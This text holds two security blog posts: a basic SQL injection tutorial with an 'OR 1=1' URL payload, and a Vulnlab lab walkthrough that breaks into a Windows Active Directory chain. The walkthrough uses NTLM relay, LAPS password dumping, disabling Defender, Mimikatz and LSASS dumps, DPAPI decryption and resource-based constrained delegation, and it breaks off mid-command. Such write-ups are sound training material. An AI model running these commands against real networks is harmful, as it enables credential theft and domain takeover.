SQLi</h1><p>Let’s say for instance we have access to a website with the following URL parameter. This was accessed by clicking on the only hyperlink on the page, which gave us an output of the entries that we have access to below (Note that this website section does not actually exist on this webpage).</p>\n<blockquote>\n<p><code>http://dan-feliciano.com/section?entry_name=red</code></p>\n</blockquote>\n<ul>\n<li>This results in the following sentence being output to the website page in a notepad-like format.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Entries for RED.</span><br><span class=\"line\"></span><br><span class=\"line\">Entry 1 - RED</span><br><span class=\"line\">Entry 2 - RED</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>On the backend, the SQL table <code>COLORS</code> is the table that is being used for data on this webpage. An example table is provided below to illustrate what this could look like.*</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>TABLE: COLORS</th>\n<th>entry_color</th>\n<th>id</th>\n<th>available</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Entry 1</td>\n<td>RED</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 2</td>\n<td>RED</td>\n<td>2</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 3</td>\n<td>BLUE</td>\n<td>3</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 4</td>\n<td>BLUE</td>\n<td>4</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Entry 5</td>\n<td>YELLOW</td>\n<td>5</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Entry 6</td>\n<td>YELLOW</td>\n<td>6</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Entry 7</td>\n<td>RED</td>\n<td>7</td>\n<td>0</td>\n</tr>\n</tbody></table>\n<ul>\n<li>In order to receive this specific entry, a query will be sent to the database in order to retrieve the data in that entry. The SQL query that is sent to the database in our case is the following:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM sections WHERE entry_color = &#x27;RED&#x27; AND available = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>This SQL query consists of the following data (to which the database will interpret):</p>\n<ul>\n<li><code>SELECT * FROM sections</code> will select all column&#x2F;row entries from the <code>sections</code> table.</li>\n<li><code>WHERE entry_color = &#39;RED&#39;</code> is the first argument, saying to only output entries within the <code>entry_name</code> column with the entry value ‘RED’.</li>\n<li><code>AND available = 1</code> is another argument that says to also only include entries with an <code>available</code> value of 1.</li>\n</ul>\n<p>If we put all of this together based on the table that was provided based on the backend above, then the entry that will be given to us are <code>Entries 1 and 2</code>. To keep in-line with the example, let’s say that we’re unable to access any other parameters by just editing the URL and retrieving the other parameters. The only space we have access to is this webpage with static entries.</p>\n<p>The main bar in our specific situation is the <code>available</code> value. As you may have noticed, the query that is being sent to the database will only return entries that have an <code>available</code> value of 1. This means that all values that are output to the webpage from the database will only include <code>Entries 1 and 2</code> and will NOT include <code>Entry 7</code>. The other entries are also barred from the output since they do not include an <code>entry_color</code> value of ‘RED’.</p>\n<p>In order to circumvent this in a basic scenario, we could construct an input into the URL parameter to exploit this simple weakness and exfil not just <code>Entry 7</code>, but all entries as a result.</p>\n<blockquote>\n<p><code>http://dan-feliciano.com/section?entry_name=red&#39;+OR+1=1--</code></p>\n</blockquote>\n<p>In this entry, we are essentially saying that we want all entries with an <code>entry_name</code> of ‘RED’ - OR we would all entries where <code>1=1</code>, which is always true.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM sections WHERE entry_color = &#x27;RED&#x27; AND available = &#x27;1&#x27; OR 1=1</span><br></pre></td></tr></table></figure>\n\n<p>Due to the conditional <code>OR</code> statement being fulfilled, the <code>SELECT</code> query will instead return all of the entries. <code>SELECT * FROM sections</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Entries for RED.</span><br><span class=\"line\"></span><br><span class=\"line\">Entry 1 - RED</span><br><span class=\"line\">Entry 2 - RED</span><br><span class=\"line\">Entry 3 - BLUE</span><br><span class=\"line\">Entry 4 - BLUE</span><br><span class=\"line\">Entry 5 - YELLOW</span><br><span class=\"line\">Entry 6 - YELLOW</span><br><span class=\"line\">Entry 7 - RED</span><br></pre></td></tr></table></figure>\n\n<p>As denoted above, this has returned all of the entries and we have successfully exploited the SQLi vulnerability.</p>\n<p>Be wary of issues as these, as in some cases our queries may come into contact with a <code>DELETE</code> or an <code>UPDATE</code> statement, meaning that they could accidentally delete or alter data. It’s important to take into consideration what the result of our query will do, as we want to circumvent harmful changes like these. When red-teaming, ensure that you understand the queries that will be sent to the database and that you keep as low of a profile as possible.</p>\n<p>Big thanks to PortSwigger (the creators of Burpsuite), as this post was inspired by the documentation they have as I continue to progress through all of their web-app labs.</p>\n<p><img src=\"/images/research/sqli-basics/c.png\"></p>\n<p>This was a practice web-page implementation on what I’d like to see in my research. I expect to research more into SQLi and other web-application attacks in the future.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://portswigger.net/web-security/sql-injection\">https://portswigger.net/web-security/sql-injection</a><br><a href=\"https://owasp.org/www-community/attacks/SQL_Injection\">https://owasp.org/www-community/attacks/SQL_Injection</a><br><a href=\"https://www.imperva.com/learn/application-security/sql-injection-sqli/\">https://www.imperva.com/learn/application-security/sql-injection-sqli/</a></p>\n"},{"title":"Reflection - Vulnlab","date":"2024-06-23T00:31:39.000Z","keywords":"Vulnlab, Medium, Windows","description":"Reflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn't seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.","cover":"/images/vulnlab/reflection-vl/reflection_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\n\nReflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn't seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.\n\n# Enumeration\n\nOur three machines are `10.10.255.149-151`. We'll query each of these with the NMAP scans that we usually run.\n\n```\n└─$ sudo nmap 10.10.255.149 && sudo nmap 10.10.255.150 && sudo nmap 10.10.255.151\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT\nNmap scan report for 10.10.255.149\nHost is up (0.12s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n1433/tcp open  ms-sql-s\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT\nNmap scan report for 10.10.255.150\nHost is up (0.11s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n1433/tcp open  ms-sql-s\n3389/tcp open  ms-wbt-server\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:19 EDT\nStats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 0.65% done\nNmap scan report for 10.10.255.151\nHost is up (0.11s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 20.11 seconds\n```\n\nIt seems that this environment is solely Windows Active Directory, with no domain-joined Linux machines available. We have a domain controller running on `.53` given that both Kerberos and the DNS services are running on that machine. We then have two workstations on `.150` and `.151`, from which `.150` seems to be a workstation with an external facing MSSQL service (which is already a vulnerability).\n\nNote that if you wanted to view the domain names for each of the machines, I learned that you don't have to use NMAP scripts to do so. You can simply use `crackmapexec` to query SMB on all of the workstations, as all of them contain this service.\n\n```\n└─$ crackmapexec smb 10.10.255.149-167\nSMB         10.10.255.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nSMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nSMB         10.10.255.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)\n```\n\nGiven that both `MS01` and `WS01` have SMB and RDP running, my first guess is for us to attempt to interact with these services for any null authentication. We'll give those a go starting with SMB with the below commands.\n\n```\n└─$ smbclient -L 10.10.255.(150 or 151) -N\n\n└─$ smbclient -L 10.10.255.150 -N\n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nstaging         Disk      staging environment\n```\n\nIt seems that on `MS01` (the workstation running MSSQL) allows us to list shares with null authentication. Furthermore, the share `staging` seems to be an uncommon name for a share so we'll query this to see if there's anything we can find.\n\n```\n└─$ smbclient \\\\\\\\10.10.255.150\\\\staging -N\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jun  7 13:42:48 2023\n  ..                                  D        0  Wed Jun  7 13:41:25 2023\n  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023\n\n                6261245 blocks of size 4096. 1166816 blocks available\nsmb: \\> get staging_db.conf\ngetting file \\staging_db.conf of size 50 as staging_db.conf (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\nsmb: \\> exit\n```\n\n# MSSQL Enumeration on MS01\n\nWe have access to the `staging_db.conf` being the only file in this share, so we'll pull it to our localhost to see if it has any important information.\n\n```\n└─$ cat staging_db.conf \nuser=web_staging\npassword=Washroom510\ndb=staging\n```\n\nThe configuration file seems to have credentials for us for the `web_staging` user. I ran a few of these through crackmapexec to see if they're valid credentials to the domain controller, however it does not seem that we can use it to query the DC.\n\nI gave a few of the services that are local to `MS01` a try such as SMB or RDP, however our credentials don't seem to work to those services. Let's look at the MSSQL service specifically, I had the initial thought that these credentials went there however I wanted to test for password reusage in the other areas of the environment before moving on.\n\n```\nSQL (web_staging  dbo@staging)> select * from users;\nid   username   password        \n--   --------   -------------   \n 1   b'dev01'   b'Initial123'   \n\n 2   b'dev02'   b'Initial123'\n```\n\nIt seems like we have credentials from for two users, `dev01` and `dev02`. Unfortunately, I ran a few tests against CME as these users and it seems that there isn't much that we can access from these users.\n\n# NTLM Relay to DC01\n\nThis lead me down to a new type of attack that we can exploit that follows a similar title to the name of the box. When I think of the word \"Reflection\", the first type of attack with a similar connotation that comes to mind is relaying. There are various types of relaying attacks such as SMB, SMTP, or NTLM relay, so we'll need to understand what we're dealing with in order to determine the type of relay attack.\n\nEssentially our goal is to relay another user's credentials that we do NOT know. At a low-level, this is essentially what relaying will do for us; relay a user's authentication from one service on one machine to another service (potentially on another). I want to stress that this exploit is helpful when you're able to trigger authentication attempts and relay them from an account that you do NOT own to another service.\n\nOur current situation may not seem to have those prerequisites, since we aren't aware of any other users and their respective passwords. While we initially think that we only have access to three users currently, we actually have access to one more.\n\nThe way I interpreted this may be incorrect and someone can feel free to correct on this if need be, however the fourth account that we can force an authentication attempt against is actually right in MSSQL. You see, when you execute a command in MSSQL or when you execute a query, it's the service account that actually queries that information for you. While we don't know the specific username to the service account (which can vary from box to box), we can force it to authenticate to a machine that we own.\n\nThis can be done by utilizing the `xp_dirtree` MSSQL command built into Impacket, which essentially allows us to query a folder on the local host. This can also however, be used to query folders on remote hosts. This means we can point the directory listing command back to our local Kali machine. Our goal is to relay the authentication, however I just want to show the proof-of-concept of what I mean before we continue.\n\nWe can boot up `responder` on a separate terminal pane with `sudo responder -I (VPN interface)`.\n\n![](/images/vulnlab/reflection-vl/b.png)\n\nAs you can from the above, a successful hash was captured for `svc_web_staging`. While we probably can't crack the hash for this account, this does prove that we have the ability to relay the credentials.\n\nTo do this, we can use a tool from Impacket called [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). This tool will relay the NTLM hash that we can see much like in Responder and use that NTLM hash to authenticate to another service. We can relay the credentials to any service on a target machine, should that service allow for NTLM authentication and allows `svc_web_staging` to authenticate to it. Let's try SMB, though you could also point it to the MSSQL service on the DC if you'd like.\n\nWe can start `ntlmrelayx` with the below command, ensuring that we specify the `-i` option for an interactive session.\n\n```\n└─$ impacket-ntlmrelayx -t smb://10.10.255.149 -smb2support -i\n```\n\nThis should launch about over 10 protocols that will listen for incoming requests, much like Responder did. All that's left now is to query our localhost on the MSSQL workstation and forward the request to SMB.\n\n![](/images/vulnlab/reflection-vl/c.png)\n\nAs you can see, an SMB client shell was started on our local machine on port 11000. We can connect to this easily using netcat. Be sure that you do NOT close out of `ntlmrelayx` until we've finished using the local shell.\n\n# SMB/MSSQL Enumeration on DC01\n\n```\n└─$ nc 127.0.0.1 11000\nType help for list of commands\n# help\n\n open {host,port=445} - opens a SMB connection against the target host/port\n```\n\nWe seem to have a semi-interactive SMB shell, which has successfully connected to the DC through NTLM relay. We can now enumerate the SMB shares in the context of `svc_web_staging`. You can enumerate shares with the `shares` command.\n\n```\n# shares\nADMIN$\nC$\nIPC$\nNETLOGON\nprod\nSYSVOL\n# use prod\n# ls\ndrw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .\ndrw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..\n-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf\n```\n\nAs you can see from the above, there is a `prod_db.conf` file within the `prod` share, we'll grab this to see if there's anything we can find within it. You can do so with a simple `get` command.\n\n```\n└─$ cat prod_db.conf\nuser=web_prod\npassword=[...snip...]\ndb=prod\n```\n\nThis file contains the password for `web_prod`, who I would assume much like `web_staging` is able to authenticate regularly to the MSSQL service on the DC. While you can't verify this with `crackmapexec` as this requires your request to go to LDAP (which is currently blocking logins from untrusted domains).\n\nHowever if we attempt to log-in with Impacket, we can see that the request travels through as intended.\n\n```\n└─$ impacket-mssqlclient reflection.vl/'web_prod':'[...snip...]'@10.10.255.149                     \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (web_prod  guest@master)>\n```\n\nLet's enumerate a little further into a few of the tables, I noticed immediately that there was a different table in this MSSQL service titled `prod`, so we'll look into that. \n\nNote that if you relayed your `svc_web_staging` NTLM credentials to MSSQL when we were performing NTLM relay earlier, you would NOT have access to this database. This is because only `web_prod` is able to query it, meaning you would have to relay to SMB anyways. You'd be able to verify that the `prod_db.conf` file exists since you can query the local filesystem with `xp_dirtree` and you would notice that you can view the SMB shares from the `C:\\` drive.\n\n```\nSQL (web_prod  guest@master)> use prod\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'prod'.\nSQL (web_prod  dbo@prod)> select table_name from information_schema.tables\ntable_name   \n----------   \nusers\n```\n\nAs you can see, there is a similar `users` table within this database, so let's query it to see if there are any other credentials we can receive.\n\n```\nSQL (web_prod  dbo@prod)> select * from users\nid   name              password            \n--   ---------------   -----------------   \n 1   b'abbie.smith'    b'[...snip...]'   \n\n 2   b'dorothy.rose'   b'[...snip...]'\n```\n\nThis gives us the credentials to both `abbie.smith` and `dorothy.rose`, both being domain users within the AD instance of this chain. At this point - we should be fine to close out of NTLM relay for now as we won't need it anymore.\n\n# Domain Enumeration with Bloodhound\n\nWhile we weren't able to query LDAP earlier since we were using accounts that cause the untrusted domain rule to execute, we now have proper domain user credentials meaning we can query LDAP as we normally would. Let's dump the domain with these credentials using the [Bloodhound Python ingestor](https://github.com/dirkjanm/BloodHound.py).\n\n```\n└─$ bloodhound-python -d 'reflection.vl' -u 'abbie.smith' -p '[...snip...]' -c all -ns 10.10.255.149 --zip\n```\n\nNow that we have all of the domain objects dumped to a compressed archive, we can load these into [Bloodhound](https://github.com/BloodHoundAD/BloodHound).\n\nAfter uploading them to the Bloodhound database, let's take a look at some of the users that we can potentially exploit to get onto one of the workstations. Note that although you have credentials to `abbie.smith` and `dorothy.rose`, they do NOT have access to WinRM or RDP or either of the `WS01` or `MS01` workstations.\n\nWhen looking around at the accounts that we currently have control over, I noticed that one of the users, `abbie.smith`, has a notable outbound object control. \n\n![](/images/vulnlab/reflection-vl/d.png)\n\nIt seems that `abbie.smith` has `GenericAll` over the `MS01` workstation. This specific object control is otherwise known as full control, meaning the `MS01` workstation allows `abbie.smith` to manipulate it however it may wish. Normally if we had `GenericAll` over a domain user, we would just be able to change the domain user's password with `bloodyAD`. That being said, we have this privilege over the machine itself instead of a specific user.\n\nThere are a few things that we can try, notably resource-based constrained delegation (RBCD) or local administrator password solution (LAPS) exploitation. The only issue with RBCD is that we do not have control of a machine that has an SPN set to do this. We also can't add a computer due to both `abbie.smith` and `dorothy.rose` having a MachineAccountQuota (MAQ) value of 0. We would need a MAQ value of either 1 or above to be able to do this.\n\n# Reading LAPS Password for MS01\n\nThus, let's try exploiting [LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview). This specific service is a Windows feature within most Active Directory environments and Microsoft Entra environments. It essentially backs up the password of the local administrator account of the machine it is enabled on and acts like a cache that stores the respective administrator password. Due to us having `GenericAll` over the machine account, we can read the LAPS password of the Administrator account on this workstation.\n\nEasily enough `crackmapexec` has a built-in module to do this, which will dump the LAPS password of the `MS01` machine. We'll need to point our request to LDAP on the DC first before specifically reading the LAPS password of the Administrator on `MS01`.\n\n```\n└─$ crackmapexec ldap 10.10.255.149 -u 'abbie.smith' -p '[...snip...]' --kdcHost 10.10.255.150 -M laps\nSMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nLDAP        10.10.255.149   389    DC01             [+] reflection.vl\\abbie.smith:[...snip...]\nLAPS        10.10.255.149   389    DC01             [*] Getting LAPS Passwords\nLAPS        10.10.255.149   389    DC01             Computer: MS01$                Password: [...snip...]\n```\n\nAs you can see, the password was dumped successfully. Note that this exploit would only work if LAPS was actually running on the target and we had the respective privilege to be able to dump it.\n\nNow that we have the password for that user, we should be able to log in as them. Although testing your credentials `crackmapexec` onto services such as WinRM or RDP on this workstation would come back negative, you can still log in as you normally would through either of those services. Let's use them to log in to WinRM using `evil-winrm`.\n\n```\n└─$ evil-winrm --ip 10.10.255.150 -u 'Administrator' -p '[...snip...]' \n    \nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                           \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat C:\\Users\\Administrator\\Desktop\\flag.txt\n[...snip...]\n```\n\nNow that we have control over the `MS01` workstation, we can read the first flag as seen above.\n\n# Pivoting to WS01\n\nLet's now turn our attention to the next part of the chain, as we'll need to escalate to the other workstations on the environment. Given the rule of thumb with these chains, I'm assuming that we'll need to compromise `WS01` first before the DC.\n\nWe'll take a look at Bloodhound again to see if there are any domain user objects that we can use pivot to `WS01`. I first searched through the `domain users` group and selected all of the `Direct Members` to view every user account on the domain. \n\nI immediately saw something different here with another user on the domain, that user being `Georgia.Price`.\n\n![](/images/vulnlab/reflection-vl/e.png)\n\nAs you can see from the screenshot above, it seems as though `Georgia.Price` has the same `GenericAll` permissions that `abbie.smith` had, this time being on `WS01`. This means with `Georgia.Price`'s credentials, we should be able to either read the LAPS password or exploit RBCD on `WS01`. The only stipulate here is that we do not current possess those credentials.\n\n# Credential Hunting on MS01\n\nNow that we have the ability to enumerate `MS01`, we can do a bit of credential hunting to see if we can find the password for `Georgia.Price`. I stood up a [Sliver C2](https://github.com/BishopFox/sliver) server so we can easily transfer files without needing to curl our binaries to the respective machines we control.\n\nWe'll need to disable AV first before getting our implant onto `MS01`, we have the ability to do that given that we are the Administrator on the machine.\n\n```\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Set-MpPreference -DisableRealTimeMonitoring $true\n```\n\n![](/images/vulnlab/reflection-vl/f.png)\n\nThere are a few things that we can do to try and hunt for this password, I'll show three methods that I tried initially before showing the solution. While these first two solutions are not the answer for retrieving the credentials for `Georgia.Price`, they are helpful to try in other scenarios.\n\nFirstly what comes to mind, since we have access to the local Administrator account on `MS01`, we can dump all of the cached credentials in memory. We'll do so by dropping [Mimikatz](https://github.com/ParrotSec/mimikatz) to the filesystem.\n\n```\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n[...snip...]\nmimikatz(commandline) # exit\n```\n\nThis should dump all of the cached credentials, though none of them seem to be of use. If `Georgia.Price` did have a cached credential, it would be here. We do see `svc_web_staging`'s plaintext password, however this doesn't seem to be of help to us.\n\nNext thing we could try is retrieving the LSASS from this machine and reading the machine secrets to see if there are any passwords stored here. You might think that we just did that with Mimikatz above, however doing this can also dump the master keys and GUIDs for any cached DPAPI credentials stored on the machine.\n\nFirst, you'll need to dump the LSASS on the remote machine. While you can do it straight from Sliver, this is incredibly loud and also the potential to crash your session since AV can still track this large handle even though we've disabled it in our current process. There are alternatives to this, notably using [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) which is not picked up by AV as a malicious executable. The great thing about using `procdump` is that I found the executable for it within `C:\\Tools`, meaning we don't need to transfer it from our Kali machine.\n\n```\n*Evil-WinRM* PS C:\\Tools> .\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp\n*Evil-WinRM* PS C:\\Tools> mv lsass.dmp C:\\Users\\Administrator\\Documents\n```\n\nNow that we have the LSASS dumped to a file, we'll put it to our Kali machine through Sliver and read it with `pypykatz`.\n\n```\n└─$ pypykatz lsa minidump lsass.dmp\n[...snip...]\n== DPAPI [3e7]==\nluid 999\nkey_guid d0486e64-ff99-4f38-8962-56d7767effbd\nmasterkey ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0\nsha1_masterkey 21a9c244e05002762c3b3f51845a58677a921e2e\n== DPAPI [3e7]==\nluid 999\nkey_guid e233b32e-4d94-4f33-8404-b89d08003375\nmasterkey 73694a6e64f4ff7947bdad1cc3fe941df4deb26b33060405eab4ce3225db174bd6e0045c1dd2d7b50403f60fc9ce01b908f1925c937f77be3fa85e24db2c6d68\nsha1_masterkey 10134d260068b772beec3f5c7e8a6828b68d2023\n== DPAPI [3e7]==\nluid 999\nkey_guid ea60aa58-d914-4cb4-a993-ca09a343fc78\nmasterkey a91c09519bbf0b28ca662f8c0b8f680b5902f9e99438df44d6e2563ca5156259ece153cc041dce1dca518f633d299adb530d37686218a5d84e409a600468b20d\nsha1_masterkey b4ac52b7d91b71f7010a9aed39e35ea92e8391b0\n```\n\nWe'll take note of these DPAPI credential master keys for now.\n\nLastly, you can also try enumerating scheduled tasks. We can do so by dumping all tasks and their attributes using `schtasks` in our WinRM session. I learned to do during my time doing [Tengu](https://dan-feliciano.com/2024/06/05/tengu/), which is also a great machine to try for practice.\n\n```\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> schtasks /query /v /fo LIST > tasklist.txt\n```\n\nWe can pull this to our local Kali machine through Sliver to read it. I found an interesting task denoted as `\\Backup` that seems to be owned by `Georgia.Price`.\n\n![](/images/vulnlab/reflection-vl/g.png)\n\nThis task seems to be running as that user, which prompts us to attempt to see if we can edit it. Luckily enough we don't have to do that through PowerShell, as we have Administrator access to RDP so we can just do it through the Task Scheduler GUI. The only issue with this method is that we are required to enter `Georgia.Price`'s credentials in order to edit the scheduled task. If we had the ability to do this, we could easily MITM the `ls` request and point it to Responder, to which we could then try to crack the NetNTLMv2 hash that we'd receive.\n\n# Dumping DPAPI Cached Credentials\n\nSo pulling this all together, it does not seem that any of the aforementioned methods are usable to receive `Georgia.Price`'s plaintext credentials. However, as I showed from before we do have access to a few master keys that may correspond to cached DPAPI credentials.\n\nWe can run [Seatbelt](https://github.com/GhostPack/Seatbelt) from Sliver C2, you could also compile it with Visual Studio and drop the executable to the filesystem. The Sliver armory contains `seatbelt` so we'll just do it from there.\n\n```\nsliver (reflection) > seatbelt WindowsCredentialFiles\n......\n  Folder : C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\n\n    FileName     : 2A5FD8B6E555858DE1974096F0A5DD39\n    Description  : Local Credential Data\n    MasterKey    : d0486e64-ff99-4f38-8962-56d7767effbd\n    Accessed     : 6/7/2023 12:22:44 PM\n    Modified     : 6/7/2023 12:22:44 PM\n    Size         : 576\n```\n\nIf you remember earlier, the master key was a relatively long string of text at the bottom of our DMP file. That is the unencrypted master key, which normally we would use the corresponding GUID to decrypt it. Luckily enough, now that we have the decrypted master key, we just need to plug the right one into its respective credential file.\n\nI left one of the credential files in the above output as it corresponds to the GUID that was listed for one of the DPAPI master keys from the DMP file. There is another credential file with the same GUID, however I found after some testing that it is not the correct credential file for us to exploit. This just takes some trial and error if you have the same GUID for multiple master keys.\n\nIf we have the correct master key and its corresponding credential file, we should be able to dump the credential blob (otherwise being the plaintext password) for the user it belongs to. I'll put all of the respective attributes that we have to dump the credential blob.\n\n* Key GUID - `d0486e64-ff99-4f38-8962-56d7767effbd`\n* Master Key - `ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0`\n* Credential File - `C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39`\n\nGiven that we have all of the assets required, let's use Mimikatz once more to dump the credential blob. I've found that running through WinRM prompts an error, however if you log in as the Administrator through RDP it should work as intended.\n\n```\nPS C:\\Users\\Administrator\\Documents> .\\mimikatz.exe \"dpapi::cred /in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39 /masterkey:ca00bf269b1c1879ad1d664d6fadd9d4169b408e95[...snip...]3f1c55d5b772d3d404c520c886413321af99caf0\" \"exit\"\n\n......\n  TargetName     : Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370}\n  UnkData        : (null)\n  Comment        : (null)\n  TargetAlias    : (null)\n  UserName       : REFLECTION\\Georgia.Price\n  CredentialBlob : [...snip...]\n  Attributes     : 0\n```\n\nAs you can see, this credential file seemed to correspond to `Georgia.Price`. Our theory for task scheduler from before was half correct, as the plaintext password for the user is stored on this task. The credential blob that we dumped corresponded to this specific task scheduler credential attribute, as this is where it is stored.\n\n# Exploiting Resource-Based Constrained Delegation\n\nWe can now use the `GenericAll` permissions as `Georgia.Price` to exploit the `WS01` workstation.\n\nI tested for LAPS once again to see if we could read the corresponding LAPS password, however I did not come back with any results. This is because unlike `MS01`, `WS01` does not have LAPS configured to run.\n\nDespite this, we do have another exploit that we can test - RBCD. Resource-based constrained delegation essentially allows us to utilize a compromised machine account to request for a service ticket in which we impersonate the user that it belongs to. The reason that this did not work before is that we did not have control over a machine account that could do this. However, now that we do have one being `MS01$`, we can exploit this functionality.\n\nWe'll first need to set the delegation properties between `MS01$` and `WS01$` respectively so that `MS01` can perform delegation on behalf of users in `WS01`. Impacket has a utility to do this.\n\n```\n└─$ impacket-rbcd -delegate-from 'MS01$' -delegate-to 'WS01$' -action 'write' 'reflection.vl/georgia.price:[...snip...]'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)\n```\n\nNow that we have that set, we can now exploit S4U2Proxy to request for a service ticket to CIFS (being SMB) as the Administrator user.\n\nThe only stipulate here is that we'll need the plaintext password of the `MS01$` machine account to do this. We did dump all the credentials to the `MS01` machine earlier from Mimikatz, so we can use the machine account's NTLM hash and pass-the-hash to Impacket command we're about to run.\n\n```\n└─$ impacket-getST -spn 'cifs/ws01.reflection.vl' -impersonate 'Administrator' 'reflection.vl/MS01$' -hashes :548f3a[...snip...]0eaadb1\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache\n```\n\nNow that we have a saved Kerberos service ticket as the Administrator user, we can now dump the secrets of `WS01` remotely with `secretsdump`.\n\n```\n└─$ 